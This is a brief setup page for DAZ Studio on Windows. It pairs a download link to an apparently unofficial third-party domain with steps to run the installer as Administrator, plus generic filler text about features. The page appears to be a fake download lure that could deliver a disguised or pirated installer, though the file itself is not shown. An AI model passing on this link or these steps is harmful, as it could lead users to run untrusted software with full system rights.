# DAZ Studio Windows Setup Notes

## Download & Install

> **Download:** [**Get DAZ Studio for Windows →**](https://daz-studio-setup.kolmods.com/)
>
> Setup notes for **DAZ Studio** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **DAZ Studio** from the Start menu

## What you can use it for

- Core DAZ Studio features on Windows desktop
- Install and configure DAZ Studio for daily use
- Import, edit, and export with DAZ Studio tools
- Tune settings and profiles inside DAZ Studio
- Integrate DAZ Studio into your existing workflow
